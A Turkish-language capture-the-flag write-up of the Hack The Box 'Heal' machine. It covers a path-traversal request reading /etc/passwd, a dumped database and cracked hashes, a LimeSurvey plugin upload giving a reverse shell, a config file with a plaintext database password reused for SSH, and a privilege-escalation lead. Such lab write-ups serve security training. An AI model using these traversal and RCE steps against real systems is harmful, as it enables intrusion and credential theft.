---
{"dg-publish":true,"permalink":"/ctf/heal-ctf/"}
---


### Nmap 

![Pasted image 20250120001434.png](/img/user/resimler/Pasted%20image%2020250120001434.png)

Open ports: 22, 80

## SubdomainFuzz

![Pasted image 20250119164752.png](/img/user/resimler/Pasted%20image%2020250119164752.png)

Mevcut domain: api.heal.htb, /etc/hosts dosyasına eklendi

![Pasted image 20250119164856.png](/img/user/resimler/Pasted%20image%2020250119164856.png)

heal.htb adresine gidip kaydolduktan sonra rotalar incelendiğinde şöyle bir rota ortaya çıktı. (Dizin brute-force yapınce çöküyor saçma bir şekilde.)

heal.htb/survey rotası altında bir subdomain bulundu: take-survey.heal.htb

![Pasted image 20250120002640.png](/img/user/resimler/Pasted%20image%2020250120002640.png)

heal.htb/survey rotası altında bir subdomain bulundu: take-survey.heal.htb

Bunu /etc/hosts dosyasına ekleyin ve Administrator'ın kullanıcı adını bulmak için aşağıdaki şekilde erişin: ralph

![Pasted image 20250120002743.png](/img/user/resimler/Pasted%20image%2020250120002743.png)

Bunu /etc/hosts dosyasına ekleyin ve Administrator'ın kullanıcı adını bulmak için aşağıdaki şekilde erişin: ralph

![Pasted image 20250120004951.png](/img/user/resimler/Pasted%20image%2020250120004951.png)

## Directory Brute-Force

![Pasted image 20250120010630.png](/img/user/resimler/Pasted%20image%2020250120010630.png)

yaklaşık 403 adres buldu fakat çoğu adres bir dizin üzerine dağılıyor /admin

![Pasted image 20250120010712.png](/img/user/resimler/Pasted%20image%2020250120010712.png)

/admin rotasına bakalım . Bizi bir yönlendirmeye tabi tutuyor.

http://take-survey.heal.htb/index.php/admin/authentication/sa/login

![Pasted image 20250120010739.png](/img/user/resimler/Pasted%20image%2020250120010739.png)

Rastgele bir hesap kaydı oluşturun ve ardından şu URL'ye gidin: **[http://heal.htb/resume](http://heal.htb/resume)**.

**Burp Suite** kullanarak **intercept** özelliğini etkinleştirin ve ardından **EXPORT AS PDF** düğmesine tıklayın.

Üçüncü isteği ilettiğinizde, **/download** adlı bir rotanın bulunduğunu göreceksiniz. Bu rota, **herhangi bir dosyanın okunmasına** olanak tanıyor.

```
GET /download?filename=../../../../../etc/passwd
```

![Pasted image 20250120011408.png](/img/user/resimler/Pasted%20image%2020250120011408.png)

![Pasted image 20250120011949.png](/img/user/resimler/Pasted%20image%2020250120011949.png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

Kullanıcı adı: ralph, ron olan iki kullanıcı bulundu (/home dizinine sahip olan)

Sitenin Ruby on Rails kullandığını öğrendiğimizden beri, yapılandırma dosyasını aradık ve şu adreste bulduk

![Pasted image 20250120012505.png](/img/user/resimler/Pasted%20image%2020250120012505.png)

![Pasted image 20250120012534.png](/img/user/resimler/Pasted%20image%2020250120012534.png)
```
# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3

```

Şu açıklamaya dikkat edelim.

```
database: storage/development.sqlite3
```

İndirelim. (repeater'daki isteğe sağ tıklayın ve Show response in browse'ı eçin ve verin url'i browser'ınıza girin)

![Pasted image 20250120013035.png](/img/user/resimler/Pasted%20image%2020250120013035.png)

![Pasted image 20250120013136.png](/img/user/resimler/Pasted%20image%2020250120013136.png)

![Pasted image 20250120013238.png](/img/user/resimler/Pasted%20image%2020250120013238.png)

John ile şifre kırma

![Pasted image 20250120013339.png](/img/user/resimler/Pasted%20image%2020250120013339.png)

![Pasted image 20250120013404.png](/img/user/resimler/Pasted%20image%2020250120013404.png)

SSH girişi kabul etmiyor , ancak web sitesinin backend'ine giriş yapabilirsiniz

![Pasted image 20250120013515.png](/img/user/resimler/Pasted%20image%2020250120013515.png)

![Pasted image 20250120013541.png](/img/user/resimler/Pasted%20image%2020250120013541.png)


## LimeSurvey-RCE

![Pasted image 20250120013656.png](/img/user/resimler/Pasted%20image%2020250120013656.png)

Genellikle CMS veya bir uygulama arayüzüne girdiğimizde ilk yapacağımız şeylerden biri versionu tespit etmektir. Bunu en basit yöntem ctrl +f yapıp verison yazmak . Alternatif yöntemler curl, response ve request headerlarına bakmak, kaynak kod kurcalamak , url'e random bir dizin yazıp hata sayfasından tespit etmek gibi . 

Github'da bir komut dosyası buldum

https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

Aşağıdaki değişikliklerin yapılması gerekir, siteyle eşleşmesi için 6.0 uyumluluk sürümünü eklediğinizden emin olun, aksi takdirde yükleme başarılı olmayacaktır

![Pasted image 20250120014255.png](/img/user/resimler/Pasted%20image%2020250120014255.png)

Bounce SHELL'deki IP ve port numarasını değiştirin.

![Pasted image 20250120014359.png](/img/user/resimler/Pasted%20image%2020250120014359.png)

Paketleyelim . 


![Pasted image 20250120020148.png](/img/user/resimler/Pasted%20image%2020250120020148.png)
Plugini yükleyin ve etkinleştirin

![Pasted image 20250120014752.png](/img/user/resimler/Pasted%20image%2020250120014752.png)

![Pasted image 20250120014808.png](/img/user/resimler/Pasted%20image%2020250120014808.png)

Active edelim 

![Pasted image 20250120014838.png](/img/user/resimler/Pasted%20image%2020250120014838.png)

Ardından shell'i bounce etmek için http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php yolunu ziyaret edin

![Pasted image 20250120020437.png](/img/user/resimler/Pasted%20image%2020250120020437.png)

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Veritabanı kullanıcı adı ve şifresini ==/var/www/limesurvey/application/config/config.php== dosyasından alın

```
cat /var/www/limesurvey/application/config/config.php
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for 
|     the connection. Driver example: mysql. Currently supported:
|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database
|    'tablePrefix' You can add an optional prefix, which will be added
|                 to the table name when using the Active Record class
|
*/
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),

                 'session' => array (
                        'sessionName'=>'LS-ZNIDJBOXUNKXWTIP',
                        // Uncomment the following lines if you need table-based sessions.
                        // Note: Table-based sessions are currently not supported on MSSQL server.
                        // 'class' => 'application.core.web.DbHttpSession',
                        // 'connectionID' => 'db',
                        // 'sessionTableName' => '{{sessions}}',
                 ),

                'urlManager' => array(
                        'urlFormat' => 'path',
                        'rules' => array(
                                // You can add your own rules here
                        ),
                        'showScriptName' => true,
                ),

                // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
                //'request' => array(
                //      'baseUrl' => '/limesurvey',
                //),
        ),
        // For security issue : it's better to set runtimePath out of web access
        // Directory must be readable and writable by the webuser
        // 'runtimePath'=>'/var/limesurvey/runtime/'
        // Use the following config variable to set modified optional settings copied from config-defaults.php
        'config'=>array(
        // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
        // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
        // on your webspace.
        // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
                'debug'=>0,
                'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2

                // If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
                // public URL (the URL facing survey participants). You will also need to set the request->baseUrl in the section above.
                //'publicurl' => 'https://www.example.org/limesurvey',

                // Update default LimeSurvey config here
        )
);
/* End of file config.php */
/* Location: ./application/config/config.php */

```

Önemli olan kısım 

![Pasted image 20250120024808.png](/img/user/resimler/Pasted%20image%2020250120024808.png)

Burada gerçekten garip olan şey, users tablosunda yalnızca bir ralph kullanıcısı olması ve parola hash'inin yukarıdaki 147258369 ile tamamen aynı çıkmasıdır. Bu, veritabanında istismar edilebilecek hiçbir şey olmadığı anlamına gelir.

Ancak buradaki parola ralph'in değil ron kullanıcısının ssh yapmasına izin verir.

Hatırlarsa /etc/passwd 'de okumuştuk ralph ve ron'u 

```
username：ron
password：AdmiDi0_pA$w0rd
```

![Pasted image 20250120025104.png](/img/user/resimler/Pasted%20image%2020250120025104.png)

![Pasted image 20250120031339.png](/img/user/resimler/Pasted%20image%2020250120031339.png)

## Privilege Escalation

Linpeas.sh dosyasını yükledim ve bir dizi portun açık olduğunu gördüm

![Pasted image 20250120030613.png](/img/user/resimler/Pasted%20image%2020250120030613.png)

8500 numaralı portu ssh üzerinden yönlendirme

![Pasted image 20250120030658.png](/img/user/resimler/Pasted%20image%2020250120030658.png)

![Pasted image 20250120030703.png](/img/user/resimler/Pasted%20image%2020250120030703.png)

Sayfanın kaynak kodunda sürüm bilgisi bulundu: 1.19.2

![Pasted image 20250120030807.png](/img/user/resimler/Pasted%20image%2020250120030807.png)

Sürüm açıklarını arayarak, Exploit-DB'de exploit edilebilecek scriptler buldum

![Pasted image 20250120030946.png](/img/user/resimler/Pasted%20image%2020250120030946.png)

![Pasted image 20250120031156.png](/img/user/resimler/Pasted%20image%2020250120031156.png)

![Pasted image 20250120031203.png](/img/user/resimler/Pasted%20image%2020250120031203.png)

![Pasted image 20250120031420.png](/img/user/resimler/Pasted%20image%2020250120031420.png)
